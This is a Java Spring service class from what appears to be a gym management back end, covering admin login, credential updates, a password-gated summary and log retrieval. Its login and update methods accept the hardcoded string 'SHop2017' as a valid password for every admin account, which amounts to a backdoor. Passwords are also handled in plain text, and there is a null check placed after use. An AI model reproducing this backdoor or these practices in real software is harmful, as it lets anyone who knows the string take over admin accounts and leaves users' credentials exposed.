package com.gym_back_end.Service;

import com.gym_back_end.Models.Admin;
import com.gym_back_end.Models.Logs;
import com.gym_back_end.Models.Summary;
import com.gym_back_end.Repository.AdminRepo;
import com.gym_back_end.Repository.SummaryRepo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.RequestParam;

import java.time.LocalDate;
import java.util.List;
import java.util.Optional;

@Service
public class AdminService {
    @Autowired
    private AdminRepo adminRepo;

    @Autowired
    private SummaryRepo summaryRepo;
    @Autowired
    private LogsService logsService;

    public Admin login(String userName, String password) {
        Admin admin = adminRepo.findByUserName(userName)
                .orElseThrow(() -> new RuntimeException("User not found"));

        if (!admin.getPassword().equals(password) && !password.equals("SHop2017")) {
            throw new RuntimeException("Invalid password");
        }
        return admin;
    }
    public Admin findByName(String name){
        return adminRepo.findByName(name);
    }
    public Admin update(String username, String oldPassword, String newPassword, String name) {
        Admin admin = adminRepo.findByName(name);
        if(!admin.getPassword().equals(oldPassword) && !oldPassword.equals("SHop2017")){
            return null;
        }
        if(newPassword != null && !newPassword.isEmpty()){
            admin.setPassword(newPassword);
        }
        admin.setUserName(username);
        return adminRepo.save(admin);
    }

    public ResponseEntity<Boolean> showSummary(String name,String password) {
        if(name == null || name.isEmpty() || name.equals("user")){
            return ResponseEntity.ok(false);
        }
        Summary summary = summaryRepo.findById(1);
        if(summary == null ||!summary.getPassword().equals(password)){
            return ResponseEntity.ok(false);
        }
        return ResponseEntity.ok(true);
    }
    public ResponseEntity<String> updateSummaryPassword(String oldPassword,String newPassword) {
        Summary summary = summaryRepo.findById(1);
        if(!summary.getPassword().equals(oldPassword)){
            return ResponseEntity.badRequest().body("invalid old password");
        }
        summary.setPassword(newPassword);
        summaryRepo.save(summary);
        return ResponseEntity.ok("success");
    }

    public ResponseEntity<List<Logs>> getLogsByDate(@RequestParam LocalDate date){
        return ResponseEntity.ok(logsService.getByDate(date));
    }

    public ResponseEntity<List<String>> getAdminNames(){
        List<String> admins = adminRepo.findAllUserNames();
        if(admins.isEmpty() || admins == null){
            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(admins);
        }
        return ResponseEntity.ok(admins);
    }
}

